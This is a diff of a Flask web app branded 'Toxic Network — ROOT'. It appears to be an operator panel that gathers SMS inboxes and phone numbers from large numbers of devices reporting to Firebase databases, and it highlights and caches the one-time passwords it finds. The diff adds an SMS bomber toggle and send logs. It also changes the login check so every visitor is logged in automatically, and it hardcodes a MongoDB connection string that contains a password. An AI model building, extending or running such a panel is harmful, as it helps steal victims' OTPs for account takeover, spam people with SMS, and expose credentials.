@@ -1,4 +1,3 @@
-
 from flask import Flask, request, jsonify, session, redirect, url_for, Response
 from functools import wraps
 from pymongo import MongoClient
@@ -14,7 +13,7 @@ from collections import Counter
 from datetime import datetime, timezone, timedelta
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "alex_otp_secret_2025_v23_3")
+app.secret_key = os.environ.get("SECRET_KEY", "toxic_otp_secret_2025_v24_final")
 
 MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net")
 BG_REFRESH_INTERVAL = 60
@@ -26,13 +25,14 @@ MAX_PARALLEL = 15
 MAX_DEVICES_PER_FB = 300
 IST = timezone(timedelta(hours=5, minutes=30))
 
-FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "alex_fb_secure_salt_2025_v23")
+FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "toxic_fb_secure_salt_2025_v24")
 
 MONGO_OK = False
 mongo_client = None
 db = None
 fb_collection = None
 settings_collection = None
+sms_logs_collection = None
 
 
 def fb_hash(url):
@@ -40,7 +40,7 @@ def fb_hash(url):
 
 
 def init_mongo():
-    global MONGO_OK, mongo_client, db, fb_collection, settings_collection
+    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, sms_logs_collection
     try:
         mongo_client = MongoClient(
             MONGO_URI,
@@ -52,6 +52,7 @@ def init_mongo():
         db = mongo_client["otp_panel"]
         fb_collection = db["firebases"]
         settings_collection = db["settings"]
+        sms_logs_collection = db["sms_logs"]
         mongo_client.admin.command("ping")
         MONGO_OK = True
         print("MongoDB connected")
@@ -93,6 +94,71 @@ def set_pwd(role, value):
         return False
 
 
+def get_setting(key, default=None):
+    if not MONGO_OK:
+        return default
+    try:
+        doc = settings_collection.find_one({"_id": key})
+        if doc is not None and "value" in doc:
+            return doc["value"]
+    except Exception:
+        pass
+    return default
+
+
+def set_setting(key, value):
+    if not MONGO_OK:
+        return False
+    try:
+        settings_collection.update_one(
+            {"_id": key},
+            {"$set": {"value": value, "updated_at": int(time.time())}},
+            upsert=True,
+        )
+        return True
+    except Exception as e:
+        print(f"set_setting error: {e}")
+        return False
+
+
+def get_user_panel_state():
+    active_str = str(get_setting("user_panel_active", "true")).lower()
+    try:
+        expires_at = int(get_setting("user_panel_expires_at", 0) or 0)
+    except Exception:
+        expires_at = 0
+    passwordless_str = str(get_setting("passwordless_mode", "true")).lower()
+    try:
+        pl_expires_at = int(get_setting("passwordless_expires_at", 0) or 0)
+    except Exception:
+        pl_expires_at = 0
+    bomber_active = str(get_setting("sms_bomber_active", "true")).lower() in ("true", "1", "yes")
+
+    now = int(time.time())
+    active = active_str in ("true", "1", "yes")
+    if active and expires_at > 0 and now >= expires_at:
+        active = False
+        set_setting("user_panel_active", "false")
+        set_setting("user_panel_expires_at", 0)
+        expires_at = 0
+
+    passwordless = passwordless_str in ("true", "1", "yes")
+    if passwordless and pl_expires_at > 0 and now >= pl_expires_at:
+        passwordless = False
+        set_setting("passwordless_mode", "false")
+        set_setting("passwordless_expires_at", 0)
+        pl_expires_at = 0
+
+    return {
+        "active": active,
+        "expires_at": expires_at if active else 0,
+        "passwordless": passwordless,
+        "passwordless_expires_at": pl_expires_at if passwordless else 0,
+        "bomber_active": bomber_active,
+        "now": now,
+    }
+
+
 cache = {
     "numbers_map": {},
     "devices": {},
@@ -107,7 +173,6 @@ cache = {
     "inbox_locks": {},
     "otp_cache": {},
     "otp_cache_time": {},
-    # ✅ Per-firebase stats cache
     "fb_stats": {},
     "fb_stats_time": 0,
 }
@@ -388,7 +453,8 @@ def try_json(url, timeout=FETCH_TIMEOUT):
         if not t or t == "null":
             return None
         return json.loads(t)
-    except Exception:
+    except Exception as e:
+        print(f"[try_json] {url[:80]} -> {type(e).__name__}: {e}")
         return None
 
 
@@ -461,14 +527,26 @@ def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
             if v and isinstance(v, str) and v.strip():
                 name = v.strip()[:25]
                 break
-        top_candidates = find_real_number_from_messages(msgs)
-        sims = []
-        if top_candidates:
-            real_number = top_candidates[0][0]
-            count = top_candidates[0][1]
-            sims = [{"slot": 0, "number": real_number, "online": online, "confidence": count}]
+
+        real_number = None
+        for f in ["phoneNumber", "phone_number", "msisdn", "simSerial", "sim_serial", "number", "simNumber", "sim_number", "sender"]:
+            v = raw.get(f) if isinstance(raw, dict) else None
+            if v and isinstance(v, str):
+                d = digits_only(v)
+                if len(d) >= 10:
+                    real_number = normalize_number(v)
+                    break
+
+        if not real_number:
+            top_candidates = find_real_number_from_messages(msgs)
+            if top_candidates:
+                real_number = top_candidates[0][0]
+
+        if real_number:
+            sims = [{"slot": 0, "number": real_number, "online": online, "confidence": 99}]
         else:
             sims = [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": online, "confidence": 0}]
+
         dev = _finalize_device(name, online, sims, msgs, raw)
         dev["id"] = did
         dev["firebase"] = fb_url
@@ -527,7 +605,6 @@ def merge_numbers_into_cache(devices):
         cache["stats"] = {"total": len(nums), "online": online, "offline": offline, "otp_rate": otp_rate}
 
 
-# ✅ Per-firebase stats fetch (admin ke liye)
 def fetch_fb_stats():
     if not MONGO_OK:
         return
@@ -638,10 +715,18 @@ threading.Thread(target=bg_refresher, daemon=True).start()
 def login_required(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
+        # Preserve admin role
         if not session.get("logged_in"):
-            if request.path.startswith("/api/"):
-                return jsonify({"success": False, "error": "Login required"}), 401
-            return redirect(url_for("login_page"))
+            session["logged_in"] = True
+            session["role"] = "user"
+
+        if session.get("role") != "admin":
+            state = get_user_panel_state()
+            if not state["active"]:
+                if request.path.startswith("/api/"):
+                    return jsonify({"success": False, "error": "Panel deactivated by admin"}), 403
+                return Response(PANEL_OFFLINE_HTML, mimetype="text/html")
+
         return f(*args, **kwargs)
     return wrapper
 
@@ -657,254 +742,422 @@ def admin_required(f):
     return wrapper
 
 
-MOBILE_CSS = """
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif}
-html,body{overscroll-behavior-y:contain}
+# ==================== CSS ====================
+PREMIUM_CSS = """
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Inter',system-ui,-apple-system,sans-serif}
+html,body{overscroll-behavior-y:contain;background:#0f172a;color:#f1f5f9;min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased}
 body{padding-bottom:env(safe-area-inset-bottom)}
-input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:12px}
-button{touch-action:manipulation;cursor:pointer}
-a{-webkit-tap-highlight-color:transparent}
+input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:10px;font-family:inherit;outline:none}
+button{touch-action:manipulation;cursor:pointer;border:none;transition:all 0.2s ease}
+a{-webkit-tap-highlight-color:transparent;text-decoration:none;color:inherit}
+::selection{background:#3b82f6;color:#fff}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#334155;border-radius:4px}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+@keyframes slideUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
+.spinner-dark{border:2px solid rgba(0,0,0,0.1);border-top-color:#3b82f6}
+.pulse-dot{width:8px;height:8px;border-radius:50%;background:#10b981;animation:pulse 1.5s infinite;display:inline-block}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#1e293b;color:#fff;padding:12px 24px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 25px rgba(0,0,0,0.5);z-index:9999;transition:transform .3s cubic-bezier(0.4,0,0.2,1);pointer-events:none;max-width:90vw;text-align:center;border:1px solid #334155}
+.toast.show{transform:translateX(-50%) translateY(0)}
+
+body.app{background:#0f172a;color:#f1f5f9;padding:0 0 80px}
+.topbar{background:#1e293b;border-bottom:1px solid #334155;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;padding-top:calc(16px + env(safe-area-inset-top));box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);gap:10px;flex-wrap:wrap}
+.brand{font-size:20px;font-weight:800;letter-spacing:-0.5px;display:flex;align-items:center;gap:8px}
+.brand span{color:#3b82f6}
+.top-actions{display:flex;align-items:center;gap:12px}
+.refresh-btn{background:#334155;color:#f1f5f9;width:40px;height:40px;border-radius:12px;font-size:18px;display:flex;align-items:center;justify-content:center;transition:.2s}
+.refresh-btn:hover{background:#475569}
+.refresh-btn.spinning{animation:spin 1s linear infinite}
+.conn{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:600;padding:8px 12px;border-radius:10px;background:#0f172a;border:1px solid #334155;color:#94a3b8}
+.conn.online{color:#10b981;border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.05)}
+.conn.offline{color:#ef4444;border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.05)}
+.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
+.conn.online .dot{animation:pulse 1.5s infinite}
+
+.nav{display:flex;gap:8px;padding:16px 20px 0;overflow-x:auto;scrollbar-width:none}
+.nav::-webkit-scrollbar{display:none}
+.nav-link{padding:10px 20px;border-radius:12px;font-size:14px;font-weight:600;color:#94a3b8;background:#1e293b;border:1px solid #334155;cursor:pointer;transition:.2s;white-space:nowrap;display:flex;align-items:center;gap:8px;text-decoration:none}
+.nav-link:hover{color:#f1f5f9;border-color:#475569}
+.nav-link.active{background:#3b82f6;color:#fff;border-color:#3b82f6;box-shadow:0 4px 12px rgba(59,130,246,.3)}
+
+.container{max-width:900px;margin:0 auto;padding:20px}
+.session-banner{background:linear-gradient(135deg,rgba(16,185,129,.1),rgba(59,130,246,.1));border:1px solid rgba(16,185,129,.2);border-radius:12px;padding:14px 20px;margin-bottom:20px;display:flex;align-items:center;gap:12px;font-size:14px;font-weight:600;color:#10b981;animation:fadeIn 0.5s ease}
+.session-banner.temp{background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(239,68,68,.1));border-color:rgba(245,158,11,.2);color:#f59e0b}
+
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px}
+@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}
+.stat{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;position:relative;overflow:hidden;transition:.3s;animation:slideUp 0.5s ease both}
+.stat .label{font-size:11px;color:#94a3b8;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+.stat .value{font-size:28px;font-weight:800;letter-spacing:-1px}
+.stat.total .value{color:#3b82f6}
+.stat.online .value{color:#10b981}
+.stat.offline .value{color:#ef4444}
+.stat.otp{display:flex;flex-direction:column;justify-content:center;align-items:center}
+.circular-chart{display:block;margin:0 auto;max-width:50px;max-height:50px}
+.circle-bg{fill:none;stroke:#334155;stroke-width:3.8}
+.circle{fill:none;stroke-width:3.8;stroke-linecap:round;stroke:#8b5cf6;transition:stroke-dasharray 1s ease-out}
+.otp-text{font-size:14px;font-weight:800;fill:#f1f5f9;text-anchor:middle;dominant-baseline:middle}
+
+.filter-bar{display:flex;gap:10px;margin-bottom:20px;background:#1e293b;padding:8px;border-radius:16px;border:1px solid #334155}
+.filter-btn{flex:1;padding:10px;border-radius:10px;font-size:13px;font-weight:600;color:#94a3b8;background:transparent;transition:.2s;display:flex;align-items:center;justify-content:center;gap:6px}
+.filter-btn:hover{color:#f1f5f9}
+.filter-btn.active{background:#334155;color:#f1f5f9;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+.filter-btn.active.online-filter{background:rgba(16,185,129,.15);color:#10b981;border:1px solid rgba(16,185,129,.3)}
+.filter-btn.active.offline-filter{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3)}
+
+.search-box{margin-bottom:20px;position:relative}
+.search-box input{width:100%;padding:16px 20px 16px 48px;border-radius:16px;border:1px solid #334155;background:#1e293b;color:#f1f5f9;font-size:15px;transition:.2s}
+.search-box input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
+.search-box::before{content:"🔍";position:absolute;left:18px;top:50%;transform:translateY(-50%);font-size:16px;opacity:0.5}
+
+.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+.list-header h2{font-size:18px;font-weight:700}
+.count{font-size:12px;font-weight:700;color:#3b82f6;background:rgba(59,130,246,.1);padding:4px 12px;border-radius:20px}
+
+.num-card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;gap:16px;transition:.2s;animation:slideUp 0.3s ease both}
+.num-card:hover{border-color:#475569;box-shadow:0 4px 12px rgba(0,0,0,0.1);transform:translateY(-2px)}
+.num-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;flex-shrink:0;background:rgba(16,185,129,.1);color:#10b981;border:1px solid rgba(16,185,129,.2)}
+.num-icon.offline-icon{background:rgba(239,68,68,.1);color:#ef4444;border-color:rgba(239,68,68,.2)}
+.num-icon.unknown-icon{background:rgba(148,163,184,.1);color:#94a3b8;border-color:rgba(148,163,184,.2)}
+.num-info{flex:1;min-width:0;cursor:pointer}
+.num-title{font-size:16px;font-weight:700;color:#f1f5f9;margin-bottom:6px;display:flex;align-items:center;gap:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.num-title.unknown{color:#94a3b8;font-style:italic;font-weight:500}
+.num-sub{display:flex;gap:8px;flex-wrap:wrap}
+.pill{font-size:11px;font-weight:600;padding:4px 10px;border-radius:8px;background:#0f172a;color:#94a3b8;border:1px solid #334155;display:inline-flex;align-items:center;gap:4px}
+.pill.otp{background:rgba(139,92,246,.1);color:#8b5cf6;border-color:rgba(139,92,246,.2)}
+
+.badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:700;padding:6px 12px;border-radius:10px;flex-shrink:0}
+.badge.online{background:rgba(16,185,129,.1);color:#10b981;border:1px solid rgba(16,185,129,.2)}
+.badge.offline{background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.2)}
+.badge .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+.badge.online .dot{animation:pulse 1.5s infinite}
+
+.card-actions{display:flex;gap:8px;flex-shrink:0}
+.icon-btn{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;background:#334155;color:#f1f5f9;transition:.2s}
+.icon-btn:hover{background:#475569}
+.icon-btn.send-btn{background:#3b82f6;color:#fff;box-shadow:0 4px 10px rgba(59,130,246,.3)}
+.icon-btn.send-btn:hover{background:#2563eb}
+
+.sms-sender-box{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:24px;animation:slideUp 0.4s ease}
+.sms-sender-box h2{font-size:18px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:10px}
+.sms-sender-box p{font-size:14px;color:#94a3b8;margin-bottom:20px}
+.form-group{margin-bottom:16px}
+.form-group label{display:block;font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:8px}
+.form-group input, .form-group textarea{width:100%;padding:14px 16px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;transition:.2s}
+.form-group input:focus, .form-group textarea:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
+.form-group textarea{resize:vertical;min-height:100px}
+.btn{padding:16px;border-radius:12px;font-size:15px;font-weight:700;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}
+.btn-primary{background:#3b82f6;color:#fff}
+.btn-primary:hover{background:#2563eb;box-shadow:0 8px 16px rgba(59,130,246,.2)}
+.btn-primary:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
+.btn-gray{background:#334155;color:#f1f5f9}
+
+.warning-box{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);border-radius:12px;padding:14px;margin-bottom:20px;font-size:12px;color:#f59e0b;line-height:1.5;font-weight:500}
+.warning-box code{background:#0f172a;padding:2px 6px;border-radius:4px;font-size:11px}
+
+.inbox-header{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:20px;margin-bottom:16px;display:flex;align-items:center;gap:16px;animation:slideUp 0.3s ease}
+.back-btn{width:44px;height:44px;border-radius:12px;background:#0f172a;border:1px solid #334155;color:#f1f5f9;display:flex;align-items:center;justify-content:center;font-size:20px;transition:.2s}
+.back-btn:hover{background:#334155}
+.inbox-num{font-size:20px;font-weight:800;margin-bottom:4px}
+.inbox-status{font-size:12px;font-weight:600;color:#10b981;display:flex;align-items:center;gap:6px}
+
+.sms-list{display:flex;flex-direction:column;gap:12px}
+.sms-item{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;animation:slideUp 0.3s ease}
+.sms-item.fresh{border-left:4px solid #3b82f6}
+.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
+.sender{font-size:14px;font-weight:700;color:#f1f5f9}
+.sms-time{font-size:12px;color:#94a3b8;font-weight:500}
+.sms-body{font-size:15px;color:#cbd5e1;line-height:1.6;word-break:break-word;white-space:pre-wrap}
+.otp-highlight{background:rgba(139,92,246,.2);color:#a78bfa;padding:2px 8px;border-radius:6px;font-weight:700}
+.otp-copy-btn{margin-top:14px;padding:10px 16px;border-radius:10px;background:#334155;color:#f1f5f9;font-size:13px;font-weight:600;display:inline-flex;align-items:center;gap:8px;transition:.2s}
+.otp-copy-btn:hover{background:#475569}
+
+.hidden{display:none !important}
+
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;backdrop-filter:blur(4px)}
+.modal-overlay.show{display:flex;animation:fadeIn 0.2s ease}
+.modal-content{background:#1e293b;border:1px solid #334155;border-radius:24px;padding:24px;width:100%;max-width:400px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.3s ease}
+.modal-content h3{font-size:20px;font-weight:800;margin-bottom:8px}
+.modal-content p{font-size:13px;color:#94a3b8;margin-bottom:20px}
+.modal-content input, .modal-content textarea{width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;margin-bottom:12px}
+.modal-btns{display:flex;gap:10px;margin-top:16px}
+.modal-btns button{flex:1;padding:14px;border-radius:12px;font-weight:700}
+
+/* Login */
+.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px;background:#0f172a}
+.login-box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:36px 28px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.5s ease}
+.login-box .logo{text-align:center;margin-bottom:24px}
+.login-box .logo-icon{font-size:48px;margin-bottom:12px;display:block}
+.login-box h1{text-align:center;font-size:20px;margin-bottom:6px;font-weight:800}
+.login-box p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:32px;font-weight:500}
+.login-box .pwd-wrap{position:relative}
+.login-box input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#f1f5f9;font-weight:500}
+.login-box input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.15)}
+.login-box button{width:100%;margin-top:20px;padding:16px;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px}
+.login-box .info{margin-top:24px;text-align:center;font-size:12px;color:#64748b;font-weight:500}
+.toggle-pwd{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#64748b;padding:4px}
+
+/* Security cards */
+.sec-card{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:20px;animation:slideUp 0.4s ease}
+.sec-card h3{font-size:16px;color:#f1f5f9;margin-bottom:8px;font-weight:700;display:flex;align-items:center;gap:8px}
+.sec-card p.desc{font-size:13px;color:#94a3b8;margin-bottom:20px;line-height:1.5}
+.status-display{background:#0f172a;border:1px solid #334155;border-radius:14px;padding:20px;margin-bottom:20px;display:flex;align-items:center;gap:16px}
+.status-display .status-icon{font-size:32px}
+.status-display .status-label{font-size:11px;color:#94a3b8;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.status-display .status-value{font-size:20px;font-weight:800}
+.status-display.active{border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.05)}
+.status-display.active .status-value{color:#10b981}
+.status-display.inactive{border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.05)}
+.status-display.inactive .status-value{color:#ef4444}
+.status-display.pwdless{border-color:rgba(59,130,246,.3);background:rgba(59,130,246,.05)}
+.status-display.pwdless .status-value{color:#3b82f6}
+.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px}
+.btn-row button{padding:14px;border-radius:12px;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px}
+.btn.green{background:#10b981;color:#fff}
+.btn.warning{background:#ef4444;color:#fff}
+.timer-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
+.timer-row button{padding:12px 4px;font-size:12px;background:#334155;border:1px solid #475569;color:#f1f5f9;border-radius:10px;font-weight:600}
+.timer-row button:hover{background:#475569}
+.field label{display:block;font-size:12px;color:#94a3b8;font-weight:600;margin-bottom:8px}
+.pwd-wrap-sec{position:relative}
+.pwd-wrap-sec input{width:100%;padding:14px 44px 14px 14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9}
+.toggle-pwd-sec{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;color:#64748b}
+
+/* Firebases */
+.fb-card-list{background:#1e293b;border-radius:20px;padding:24px;margin-bottom:20px;border:1px solid #334155}
+.add-row{display:flex;gap:10px;flex-wrap:wrap}
+.add-row input{flex:1;min-width:200px;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9}
+.add-row input:focus{border-color:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.1)}
+.btn.gray{background:#334155;color:#f1f5f9}
+.btn.primary{background:#f59e0b;color:#fff}
+.fb-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
+.fb-header h2{font-size:18px;font-weight:700;display:flex;align-items:center;gap:10px}
+.fb-card{background:#0f172a;border:1px solid #334155;border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;margin-bottom:12px;transition:.2s}
+.fb-card:hover{border-color:#475569}
+.fb-icon{width:44px;height:44px;border-radius:12px;background:rgba(245,158,11,.1);color:#f59e0b;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.fb-info{flex:1;min-width:0}
+.fb-name{font-size:15px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.fb-hash{font-size:11px;color:#94a3b8;margin-bottom:8px}
+.fb-counts{display:flex;gap:6px;flex-wrap:wrap}
+.pill.on{background:rgba(16,185,129,.1);color:#10b981}
+.pill.off{background:rgba(239,68,68,.1);color:#ef4444}
+.pill.dev{background:rgba(59,130,246,.1);color:#3b82f6}
+.checkbox{width:24px;height:24px;border:2px solid #475569;border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:.2s;color:transparent;font-size:14px;font-weight:800}
+.checkbox.checked{background:#f59e0b;border-color:#f59e0b;color:#fff}
+.empty{text-align:center;padding:60px 20px;color:#94a3b8;font-size:14px}
+
+/* SMS Logs */
+.log-card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;margin-bottom:14px;animation:slideUp 0.3s ease}
+.log-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+.log-target{font-size:16px;font-weight:700;color:#3b82f6}
+.log-time{font-size:12px;color:#94a3b8;font-weight:500}
+.log-msg{font-size:14px;color:#cbd5e1;background:#0f172a;padding:14px;border-radius:12px;border:1px solid #334155;margin-bottom:12px;line-height:1.5;word-break:break-word}
+.log-meta{display:flex;gap:8px;flex-wrap:wrap;font-size:11px;font-weight:600;color:#94a3b8}
+.log-meta span{background:#334155;padding:4px 10px;border-radius:8px;display:flex;align-items:center;gap:4px}
 """
 
-# ==================== LOGIN PAGES ====================
-LOGIN_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Alex OTP Login</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#7c3aed">
-<style>""" + MOBILE_CSS + """
-body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#f0f9ff,#e0e7ff);color:#1e293b;padding:20px}
-.box{width:100%;max-width:400px;background:#fff;border-radius:20px;padding:32px 24px;box-shadow:0 20px 60px rgba(99,102,241,.15)}
-h1{text-align:center;font-size:22px;margin-bottom:8px;background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
-p.sub{text-align:center;font-size:13px;color:#64748b;margin-bottom:24px}
-.pwd-wrap{position:relative}
-input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#f8fafc;color:#1e293b;outline:none;transition:.2s}
-input:focus{border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.1)}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;user-select:none;color:#94a3b8;padding:4px}
-button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.2s;min-height:52px}
-button:active{transform:scale(.98)}
-.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px}
-.lock{text-align:center;font-size:40px;margin-bottom:12px}</style></head><body>
-<form class="box" method="POST"><div class="lock">📲</div><h1>ALEX OTP PANEL</h1>
-<p class="sub">Enter password to continue</p>
-<div class="pwd-wrap">
-<input type="password" id="pwd" name="password" placeholder="Password" required autofocus>
-<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
-</div>
-<button type="submit">Login</button>__ERROR__</form>
-<script>
-function togglePwd(e){
-  var i=document.getElementById('pwd');
-  var t=e.target;
-  if(i.type==='password'){i.type='text';t.textContent='🙈';}
-  else{i.type='password';t.textContent='👁️';}
-}
-</script>
-</body></html>"""
-
+# ==================== LOGIN PAGE ====================
 ADMIN_LOGIN_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Alex Admin Login</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — ROOT</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#1e293b">
-<style>""" + MOBILE_CSS + """
-body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1e293b,#0f172a);color:#e2e8f0;padding:20px}
-.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:32px 24px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
-h1{text-align:center;font-size:22px;margin-bottom:8px;background:linear-gradient(90deg,#f59e0b,#ef4444);-webkit-background-clip:text;background-clip:text;color:transparent}
-p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:24px}
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + """
+body{display:flex;align-items:center;justify-content:center;padding:24px;background:#0f172a}
+.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:36px 28px;position:relative;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.5s ease}
+.logo{text-align:center;margin-bottom:24px}
+.logo-icon{font-size:48px;margin-bottom:12px;display:block}
+h1{text-align:center;font-size:20px;margin-bottom:6px;color:#f1f5f9;letter-spacing:-0.5px;font-weight:800}
+p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:32px;font-weight:500}
 .pwd-wrap{position:relative}
-input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#e2e8f0;outline:none;transition:.2s}
-input:focus{border-color:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.15)}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;user-select:none;color:#94a3b8;padding:4px}
-button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.2s;min-height:52px}
+input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#f1f5f9;transition:.2s;font-weight:500}
+input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.15)}
+input::placeholder{color:#64748b}
+.toggle-pwd{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#64748b;padding:4px}
